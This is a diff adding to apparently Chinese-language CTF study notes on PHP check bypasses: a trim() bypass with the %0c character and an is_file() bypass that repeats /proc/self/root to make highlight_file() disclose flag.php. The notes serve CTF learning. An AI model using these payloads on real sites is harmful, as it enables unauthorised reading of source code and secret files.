@@ -167,4 +167,19 @@ if(is_numeric($num) and $num!=='36' and trim($num)!=='36'){
 trim() 去除普通空格、制表符(%09)、换行符(%0a)、回车符(%0d)、空字节符(%00)、垂直制表符（%0b），但不去除换页符%0c
 ?num=%0c36
 ```
+ 
 
+^
+## **is_file()函数绕过**
+```
+if(! is_file($file)){
+    highlight_file($file);
+}
+```
+要让其认为$file不是一个文件。
+```
+1、伪协议
+2、利用长度溢出认为不是文件
+？file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+
+```
